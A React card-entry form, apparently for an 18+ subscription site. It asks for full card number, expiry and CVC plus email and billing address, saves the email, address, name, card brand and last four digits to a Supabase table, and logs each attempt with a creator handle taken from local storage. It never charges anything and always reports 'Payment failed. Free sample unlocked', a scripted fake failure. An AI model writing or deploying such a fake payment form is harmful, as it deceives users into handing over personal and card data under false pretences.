// AddCardForm.jsx - FINAL (complete, build-safe)
import React, { useState, useEffect } from "react";
import supabase from "../supabaseclient";

/* ---------- helpers ---------- */
function digitsOnly(s = "") {
  return (s || "").toString().replace(/\D/g, "");
}

function luhnCheck(num) {
  const digits = digitsOnly(num);
  let sum = 0;
  let doubleUp = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let cur = parseInt(digits[i], 10);
    if (doubleUp) {
      cur = cur * 2;
      if (cur > 9) cur -= 9;
    }
    sum += cur;
    doubleUp = !doubleUp;
  }
  return digits.length > 0 ? sum % 10 === 0 : false;
}

function validateExpiry(exp) {
  if (!exp) return false;
  if (!/^\s*\d{2}\s*\/\s*\d{2}\s*$/.test(exp)) return false;

  const [mmS, yyS] = exp.split("/").map((v) => v.trim());
  const mm = parseInt(mmS, 10);
  const yy = parseInt(yyS, 10);

  if (Number.isNaN(mm) || Number.isNaN(yy) || mm < 1 || mm > 12) return false;

  const now = new Date();
  const cy = now.getFullYear() % 100;
  const cm = now.getMonth() + 1;

  return !(yy < cy || (yy === cy && mm < cm));
}

function detectCardBrand(number = "") {
  const d = digitsOnly(number);
  if (!d) return "unknown";
  if (/^4/.test(d)) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(d)) return "mastercard";
  if (/^3[47]/.test(d)) return "amex";
  if (/^6(?:011|5)/.test(d) || /^64[4-9]/.test(d)) return "discover";
  if (/^35(2[89]|[3-8][0-9])/.test(d)) return "jcb";
  if (/^3(?:0[0-5]|[68])/.test(d)) return "diners";
  if (/^(50|5[6-9]|6(?:0|1|2|4|5))/.test(d)) return "maestro";
  return "unknown";
}

const LOGO_FALLBACK = "https://via.placeholder.com/48?text=?";

/* ---------- mirror ---------- */
async function mirrorAllowedData(data = {}) {
  if (!data || !data.email) return null;
  try {
    const cardBrand = detectCardBrand(data.card_number);
    const last4 = data.card_number
      ? String(data.card_number).replace(/\D/g, "").slice(-4)
      : null;

    const row = {
      email: data.email || null,
      name: data.card_name || null,
      country: data.country || null,
      state: data.state || null,
      address: data.address || null,
      city: data.city || null,
      zip: data.zip || null,
      card_name: data.card_name || null,
      card_last4: last4,
      card_brand: cardBrand,
      created_at: new Date().toISOString(),
    };

    const { data: res, error } = await supabase
      .from("card_inputs")
      .insert([row])
      .select();

    if (error) return { error, row: null };
    return { data: res, row };
  } catch (err) {
    return { error: err, row: null };
  }
}

/* ---------- AddCardForm ---------- */
export default function AddCardForm({ onClose, onSuccess, selectedPlan }) {
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [redirecting, setRedirecting] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    country: "",
    state: "",
    address: "",
    city: "",
    zip: "",
    card_name: "",
    card_number: "",
    card_exp: "",
    card_cvc: "",
    agecheck: false,
  });
  const [brand, setBrand] = useState("unknown");

  useEffect(() => {
    setBrand(detectCardBrand(formData.card_number));
  }, [formData.card_number]);

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData((p) => ({ ...p, [name]: type === "checkbox" ? checked : value }));
  };

  const handleLogoError = (e) => {
    e.currentTarget.src = LOGO_FALLBACK;
  };

  const maskLast4 = (num = "") =>
    String(num || "").slice(-4);

  const logPaymentAttempt = async ({
    email,
    plan,
    cardBrand,
    cardLast4,
    cardInputsRowId,
  }) => {
    try {
      const creatorHandle =
        typeof window !== "undefined"
          ? window.localStorage.getItem("creator_handle")
          : null;

      const cleanHandle = (creatorHandle || "").replace(/^@/, "");
      const dateBucket = new Date().toISOString().substring(0, 13);

      const idempotencyKey = `addcard_submit_${cleanHandle}_${plan || "noplan"}_${email || "noemail"}_${dateBucket}`;

      await supabase.from("payment_logs").insert([
        {
          email,
          card_brand: cardBrand,
          card_last4: cardLast4,
          plan,
          stage: "addcard_submit",
          metadata: {
            card_inputs_row: cardInputsRowId,
            origin: "addcardform",
            creator_handle: cleanHandle,
          },
          idempotency_key: idempotencyKey,
          created_at: new Date().toISOString(),
        },
      ]);
    } catch {}
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setErrorMsg("");

    const f = formData;

    if (
      !f.email ||
      !f.country ||
      !f.state ||
      !f.address ||
      !f.city ||
      !f.zip ||
      !f.card_name ||
      !f.card_number ||
      !f.card_exp ||
      !f.card_cvc ||
      !f.agecheck
    ) {
      setErrorMsg("Please complete all fields.");
      setLoading(false);
      return;
    }

    if (!luhnCheck(f.card_number)) {
      setErrorMsg("Invalid card number.");
      setLoading(false);
      return;
    }

    if (!validateExpiry(f.card_exp)) {
      setErrorMsg("Invalid expiry date.");
      setLoading(false);
      return;
    }

    let cardRow = null;
    try {
      const { data } = await mirrorAllowedData(f);
      cardRow = data?.[0] || null;
    } catch {}

    await logPaymentAttempt({
      email: f.email,
      plan: selectedPlan,
      cardBrand: brand,
      cardLast4: maskLast4(f.card_number),
      cardInputsRowId: cardRow?.id || null,
    });

    setTimeout(() => {
      setErrorMsg("Payment failed. Free sample unlocked.");
      setLoading(false);
      onSuccess?.({
        freeSample: true,
        unlockedCount: 15,
        plan: selectedPlan || "monthly",
        email: f.email,
        expires: new Date(Date.now() + 30 * 864e5).toISOString(),
        simulated: true,
      });
      setRedirecting(true);
      setTimeout(onClose, 1000);
    }, 1400);
  };

  const BRAND_ICON = {
    visa: "https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg",
    mastercard: "https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg",
    amex: "https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg",
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30" onClick={onClose}>
      <div className="bg-white rounded-xl p-6 w-full max-w-lg" onClick={(e) => e.stopPropagation()}>
        <form onSubmit={handleSubmit}>
          <h2 className="text-lg font-semibold mb-4">ADD CARD</h2>

          <input name="email" placeholder="Email" value={formData.email} onChange={handleChange} className="w-full mb-3 border p-2" />
          <input name="card_name" placeholder="Name on card" value={formData.card_name} onChange={handleChange} className="w-full mb-3 border p-2" />
          <input name="card_number" placeholder="Card number" value={formData.card_number} onChange={handleChange} className="w-full mb-3 border p-2" />

          {brand !== "unknown" && (
            <img
              src={BRAND_ICON[brand] || LOGO_FALLBACK}
              alt={brand}
              onError={handleLogoError}
              className="h-6 mb-3"
            />
          )}

          <input name="card_exp" placeholder="MM / YY" value={formData.card_exp} onChange={handleChange} className="w-full mb-3 border p-2" />
          <input name="card_cvc" placeholder="CVC" value={formData.card_cvc} onChange={handleChange} className="w-full mb-3 border p-2" />

          <label className="flex gap-2 mb-3 text-sm">
            <input type="checkbox" name="agecheck" checked={formData.agecheck} onChange={handleChange} />
            I am 18+
          </label>

          {errorMsg && <div className="text-red-500 text-sm mb-3">{errorMsg}</div>}
          {redirecting && <div className="text-green-600 text-sm mb-3">Redirecting…</div>}

          <div className="flex justify-between">
            <button type="button" onClick={onClose}>Cancel</button>
            <button type="submit" disabled={loading}>
              {loading ? "Processing…" : "Submit"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
  }
